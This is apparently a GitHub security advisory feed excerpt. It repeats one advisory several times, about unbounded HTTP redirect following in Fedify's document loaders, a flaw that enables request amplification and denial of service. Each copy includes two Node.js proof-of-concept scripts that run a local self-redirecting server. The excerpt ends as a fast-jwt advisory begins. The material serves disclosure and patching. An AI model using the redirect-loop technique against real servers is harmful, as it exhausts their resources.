        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fedify/fedify</code> follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.</p>
<h3 id="details">Details</h3>
<p>Fedify verifies ActivityPub HTTP signatures by fetching the remote <code>keyId</code> during request processing. The relevant flow is <code>handleInboxInternal()</code> -&gt; <code>verifyRequest()</code> -&gt; <code>fetchKeyInternal()</code> -&gt; document loader.</p>
<p>In affected versions:</p>
<ul>
<li>the generic document loader recursively follows <code>3xx</code> responses by calling <code>load()</code> again on the <code>Location</code> header</li>
<li>the authenticated redirect path (<code>doubleKnock()</code>) also recursively follows redirects</li>
<li>neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops</li>
</ul>
<p>As a result, if an attacker-controlled <code>keyId</code> or actor URL responds with <code>302 Location: &lt;same URL&gt;</code>, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.</p>
<p>I confirmed the issue in <code>@fedify/fedify</code> 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.</p>
<p>Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same <code>keyId</code>.</p>
<h3 id="poc">PoC</h3>
<p>Minimal direct reproduction with the package:</p>
<ol>
<li>Install <code>@fedify/fedify@1.9.2</code>.</li>
<li>Save and run the following script:</li>
</ol>
<pre><code class="language-js">import http from "node:http";
import { getDocumentLoader } from "@fedify/fedify";

const port = 45679;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const loader = getDocumentLoader({ allowPrivateAddress: true });
  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<ol start="3">
<li>Observe output similar to:</li>
</ol>
<pre><code>{ count: 120 }
</code></pre>
<p>This shows the loader followed 119 self-redirects before the first non-redirect response.</p>
<p>The authenticated loader used for signed requests shows the same behavior:</p>
<pre><code>import http from "node:http";
import {
  generateCryptoKeyPair,
  getAuthenticatedDocumentLoader,
} from "@fedify/fedify";

const port = 45680;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const { privateKey } = await generateCryptoKeyPair();
  const loader = getAuthenticatedDocumentLoader(
    {
      privateKey,
      keyId: new URL("https://example.com/users/index#main-key"),
    },
    { allowPrivateAddress: true },
  );

  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.</p>
<h3 id="misc-notes">Misc Notes</h3>
<p>This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. <strong>The original reporter should be credited for the discovery</strong>.</p>
<p>In case you accept this advisory please coordinate time of disclosure and credit with us</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34148">https://nvd.nist.gov/vuln/detail/CVE-2026-34148</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.10.5">https://github.com/fedify-dev/fedify/releases/tag/1.10.5</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.9.6">https://github.com/fedify-dev/fedify/releases/tag/1.9.6</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.0.8">https://github.com/fedify-dev/fedify/releases/tag/2.0.8</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.1.1">https://github.com/fedify-dev/fedify/releases/tag/2.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T18:04:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution]]></title>
        <id>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</id>
        <link href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp"/>
        <updated>2026-04-07T18:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fedify/fedify</code> follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.</p>
<h3 id="details">Details</h3>
<p>Fedify verifies ActivityPub HTTP signatures by fetching the remote <code>keyId</code> during request processing. The relevant flow is <code>handleInboxInternal()</code> -&gt; <code>verifyRequest()</code> -&gt; <code>fetchKeyInternal()</code> -&gt; document loader.</p>
<p>In affected versions:</p>
<ul>
<li>the generic document loader recursively follows <code>3xx</code> responses by calling <code>load()</code> again on the <code>Location</code> header</li>
<li>the authenticated redirect path (<code>doubleKnock()</code>) also recursively follows redirects</li>
<li>neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops</li>
</ul>
<p>As a result, if an attacker-controlled <code>keyId</code> or actor URL responds with <code>302 Location: &lt;same URL&gt;</code>, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.</p>
<p>I confirmed the issue in <code>@fedify/fedify</code> 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.</p>
<p>Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same <code>keyId</code>.</p>
<h3 id="poc">PoC</h3>
<p>Minimal direct reproduction with the package:</p>
<ol>
<li>Install <code>@fedify/fedify@1.9.2</code>.</li>
<li>Save and run the following script:</li>
</ol>
<pre><code class="language-js">import http from "node:http";
import { getDocumentLoader } from "@fedify/fedify";

const port = 45679;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const loader = getDocumentLoader({ allowPrivateAddress: true });
  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<ol start="3">
<li>Observe output similar to:</li>
</ol>
<pre><code>{ count: 120 }
</code></pre>
<p>This shows the loader followed 119 self-redirects before the first non-redirect response.</p>
<p>The authenticated loader used for signed requests shows the same behavior:</p>
<pre><code>import http from "node:http";
import {
  generateCryptoKeyPair,
  getAuthenticatedDocumentLoader,
} from "@fedify/fedify";

const port = 45680;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const { privateKey } = await generateCryptoKeyPair();
  const loader = getAuthenticatedDocumentLoader(
    {
      privateKey,
      keyId: new URL("https://example.com/users/index#main-key"),
    },
    { allowPrivateAddress: true },
  );

  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.</p>
<h3 id="misc-notes">Misc Notes</h3>
<p>This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. <strong>The original reporter should be credited for the discovery</strong>.</p>
<p>In case you accept this advisory please coordinate time of disclosure and credit with us</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34148">https://nvd.nist.gov/vuln/detail/CVE-2026-34148</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.10.5">https://github.com/fedify-dev/fedify/releases/tag/1.10.5</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.9.6">https://github.com/fedify-dev/fedify/releases/tag/1.9.6</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.0.8">https://github.com/fedify-dev/fedify/releases/tag/2.0.8</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.1.1">https://github.com/fedify-dev/fedify/releases/tag/2.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T18:04:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/vocab-runtime] Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution]]></title>
        <id>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</id>
        <link href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp"/>
        <updated>2026-04-07T18:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fedify/fedify</code> follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.</p>
<h3 id="details">Details</h3>
<p>Fedify verifies ActivityPub HTTP signatures by fetching the remote <code>keyId</code> during request processing. The relevant flow is <code>handleInboxInternal()</code> -&gt; <code>verifyRequest()</code> -&gt; <code>fetchKeyInternal()</code> -&gt; document loader.</p>
<p>In affected versions:</p>
<ul>
<li>the generic document loader recursively follows <code>3xx</code> responses by calling <code>load()</code> again on the <code>Location</code> header</li>
<li>the authenticated redirect path (<code>doubleKnock()</code>) also recursively follows redirects</li>
<li>neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops</li>
</ul>
<p>As a result, if an attacker-controlled <code>keyId</code> or actor URL responds with <code>302 Location: &lt;same URL&gt;</code>, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.</p>
<p>I confirmed the issue in <code>@fedify/fedify</code> 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.</p>
<p>Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same <code>keyId</code>.</p>
<h3 id="poc">PoC</h3>
<p>Minimal direct reproduction with the package:</p>
<ol>
<li>Install <code>@fedify/fedify@1.9.2</code>.</li>
<li>Save and run the following script:</li>
</ol>
<pre><code class="language-js">import http from "node:http";
import { getDocumentLoader } from "@fedify/fedify";

const port = 45679;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const loader = getDocumentLoader({ allowPrivateAddress: true });
  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<ol start="3">
<li>Observe output similar to:</li>
</ol>
<pre><code>{ count: 120 }
</code></pre>
<p>This shows the loader followed 119 self-redirects before the first non-redirect response.</p>
<p>The authenticated loader used for signed requests shows the same behavior:</p>
<pre><code>import http from "node:http";
import {
  generateCryptoKeyPair,
  getAuthenticatedDocumentLoader,
} from "@fedify/fedify";

const port = 45680;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const { privateKey } = await generateCryptoKeyPair();
  const loader = getAuthenticatedDocumentLoader(
    {
      privateKey,
      keyId: new URL("https://example.com/users/index#main-key"),
    },
    { allowPrivateAddress: true },
  );

  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.</p>
<h3 id="misc-notes">Misc Notes</h3>
<p>This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. <strong>The original reporter should be credited for the discovery</strong>.</p>
<p>In case you accept this advisory please coordinate time of disclosure and credit with us</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34148">https://nvd.nist.gov/vuln/detail/CVE-2026-34148</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.10.5">https://github.com/fedify-dev/fedify/releases/tag/1.10.5</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.9.6">https://github.com/fedify-dev/fedify/releases/tag/1.9.6</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.0.8">https://github.com/fedify-dev/fedify/releases/tag/2.0.8</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.1.1">https://github.com/fedify-dev/fedify/releases/tag/2.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T18:04:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/vocab-runtime] Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution]]></title>
        <id>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</id>
        <link href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp"/>
        <updated>2026-04-07T18:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fedify/fedify</code> follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.</p>
<h3 id="details">Details</h3>
<p>Fedify verifies ActivityPub HTTP signatures by fetching the remote <code>keyId</code> during request processing. The relevant flow is <code>handleInboxInternal()</code> -&gt; <code>verifyRequest()</code> -&gt; <code>fetchKeyInternal()</code> -&gt; document loader.</p>
<p>In affected versions:</p>
<ul>
<li>the generic document loader recursively follows <code>3xx</code> responses by calling <code>load()</code> again on the <code>Location</code> header</li>
<li>the authenticated redirect path (<code>doubleKnock()</code>) also recursively follows redirects</li>
<li>neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops</li>
</ul>
<p>As a result, if an attacker-controlled <code>keyId</code> or actor URL responds with <code>302 Location: &lt;same URL&gt;</code>, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.</p>
<p>I confirmed the issue in <code>@fedify/fedify</code> 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.</p>
<p>Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same <code>keyId</code>.</p>
<h3 id="poc">PoC</h3>
<p>Minimal direct reproduction with the package:</p>
<ol>
<li>Install <code>@fedify/fedify@1.9.2</code>.</li>
<li>Save and run the following script:</li>
</ol>
<pre><code class="language-js">import http from "node:http";
import { getDocumentLoader } from "@fedify/fedify";

const port = 45679;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const loader = getDocumentLoader({ allowPrivateAddress: true });
  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<ol start="3">
<li>Observe output similar to:</li>
</ol>
<pre><code>{ count: 120 }
</code></pre>
<p>This shows the loader followed 119 self-redirects before the first non-redirect response.</p>
<p>The authenticated loader used for signed requests shows the same behavior:</p>
<pre><code>import http from "node:http";
import {
  generateCryptoKeyPair,
  getAuthenticatedDocumentLoader,
} from "@fedify/fedify";

const port = 45680;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const { privateKey } = await generateCryptoKeyPair();
  const loader = getAuthenticatedDocumentLoader(
    {
      privateKey,
      keyId: new URL("https://example.com/users/index#main-key"),
    },
    { allowPrivateAddress: true },
  );

  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.</p>
<h3 id="misc-notes">Misc Notes</h3>
<p>This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. <strong>The original reporter should be credited for the discovery</strong>.</p>
<p>In case you accept this advisory please coordinate time of disclosure and credit with us</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34148">https://nvd.nist.gov/vuln/detail/CVE-2026-34148</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.10.5">https://github.com/fedify-dev/fedify/releases/tag/1.10.5</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.9.6">https://github.com/fedify-dev/fedify/releases/tag/1.9.6</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.0.8">https://github.com/fedify-dev/fedify/releases/tag/2.0.8</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.1.1">https://github.com/fedify-dev/fedify/releases/tag/2.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T18:04:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fedify/fedify] Fedify affected by resource exhaustion caused by unbounded redirect following during remote key/document resolution]]></title>
        <id>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</id>
        <link href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp"/>
        <updated>2026-04-07T18:04:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fedify/fedify</code> follows HTTP redirects recursively in its remote document loader and authenticated document loader without enforcing a maximum redirect count or visited-URL loop detection. An attacker who controls a remote ActivityPub key or actor URL can force a server using Fedify to make repeated outbound requests from a single inbound request, leading to resource consumption and denial of service.</p>
<h3 id="details">Details</h3>
<p>Fedify verifies ActivityPub HTTP signatures by fetching the remote <code>keyId</code> during request processing. The relevant flow is <code>handleInboxInternal()</code> -&gt; <code>verifyRequest()</code> -&gt; <code>fetchKeyInternal()</code> -&gt; document loader.</p>
<p>In affected versions:</p>
<ul>
<li>the generic document loader recursively follows <code>3xx</code> responses by calling <code>load()</code> again on the <code>Location</code> header</li>
<li>the authenticated redirect path (<code>doubleKnock()</code>) also recursively follows redirects</li>
<li>neither path enforces a redirect cap or tracks visited URLs to detect self-referential redirect loops</li>
</ul>
<p>As a result, if an attacker-controlled <code>keyId</code> or actor URL responds with <code>302 Location: &lt;same URL&gt;</code>, a single ActivityPub request can trigger tens or hundreds of outbound requests before the fetch completes or the request times out.</p>
<p>I confirmed the issue in <code>@fedify/fedify</code> 1.9.1 and 1.9.2. By contrast, Fedify's WebFinger lookup path already has a redirect cap, which suggests the missing bound in the document loader is unintended.</p>
<p>Failed key fetches are not durably negatively cached. After a failed lookup, the null result is only remembered in a request-local cache, so later requests can trigger the same redirect loop again for the same <code>keyId</code>.</p>
<h3 id="poc">PoC</h3>
<p>Minimal direct reproduction with the package:</p>
<ol>
<li>Install <code>@fedify/fedify@1.9.2</code>.</li>
<li>Save and run the following script:</li>
</ol>
<pre><code class="language-js">import http from "node:http";
import { getDocumentLoader } from "@fedify/fedify";

const port = 45679;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const loader = getDocumentLoader({ allowPrivateAddress: true });
  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<ol start="3">
<li>Observe output similar to:</li>
</ol>
<pre><code>{ count: 120 }
</code></pre>
<p>This shows the loader followed 119 self-redirects before the first non-redirect response.</p>
<p>The authenticated loader used for signed requests shows the same behavior:</p>
<pre><code>import http from "node:http";
import {
  generateCryptoKeyPair,
  getAuthenticatedDocumentLoader,
} from "@fedify/fedify";

const port = 45680;
let count = 0;
const redirectCount = 120;

const server = http.createServer((req, res) =&gt; {
  count += 1;

  if (count &lt; redirectCount) {
    res.writeHead(302, {
      Location: `http://127.0.0.1:${port}/actor`,
    });
    res.end();
    return;
  }

  res.writeHead(200, { "Content-Type": "application/activity+json" });
  res.end(JSON.stringify({
    "@context": "https://www.w3.org/ns/activitystreams",
    "id": `http://127.0.0.1:${port}/actor`,
    "type": "Person"
  }));
});

await new Promise((resolve) =&gt; server.listen(port, "127.0.0.1", resolve));

try {
  const { privateKey } = await generateCryptoKeyPair();
  const loader = getAuthenticatedDocumentLoader(
    {
      privateKey,
      keyId: new URL("https://example.com/users/index#main-key"),
    },
    { allowPrivateAddress: true },
  );

  await loader(`http://127.0.0.1:${port}/actor`);
  console.log({ count });
} finally {
  server.close();
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an unauthenticated denial-of-service / request amplification issue. Any Fedify-based server that verifies remote keys or loads remote ActivityPub documents can be forced to spend CPU time, worker time, connection slots, and outbound bandwidth following attacker-controlled redirects. A single inbound request can trigger a large number of outbound requests, and the attack can be repeated across requests because failed lookups are not durably negatively cached.</p>
<h3 id="misc-notes">Misc Notes</h3>
<p>This issue was surfaced by a Ghost ActivityPub user reporting the issue directly to Ghost. The above report was generated upon further investigation into the issue by the Ghost team. <strong>The original reporter should be credited for the discovery</strong>.</p>
<p>In case you accept this advisory please coordinate time of disclosure and credit with us</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/fedify-dev/fedify/security/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34148">https://nvd.nist.gov/vuln/detail/CVE-2026-34148</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.10.5">https://github.com/fedify-dev/fedify/releases/tag/1.10.5</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/1.9.6">https://github.com/fedify-dev/fedify/releases/tag/1.9.6</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.0.8">https://github.com/fedify-dev/fedify/releases/tag/2.0.8</a></li>
<li><a href="https://github.com/fedify-dev/fedify/releases/tag/2.1.1">https://github.com/fedify-dev/fedify/releases/tag/2.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-gm9m-gwc4-hwgp">https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gm9m-gwc4-hwgp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-07T18:04:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-jwt] fast-jwt: Incomplete fix for CVE-2023-48223: JWT Algorithm Confusion via Whitespace-Prefixed RSA Public Key]]></title>
        <id>https://github.com/advisories/GHSA-mvf2-f6gm-w987</id>
        <link href="https://github.com/advisories/GHSA-mvf2-f6gm-w987"/>
        <updated>2026-04-07T17:06:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p> The fix for GHSA-c2ff-88x2-x9pg (CVE-2023-48223) is incomplete. The publicKeyPemMatcher regex in fast-jwt/src/crypto.js uses a ^ anchor that is defeated by any leading whitespace in the key string, re-enabling the exact same JWT algorithm confusion attack that the CVE patched.</p>
<h3 id="details">Details</h3>
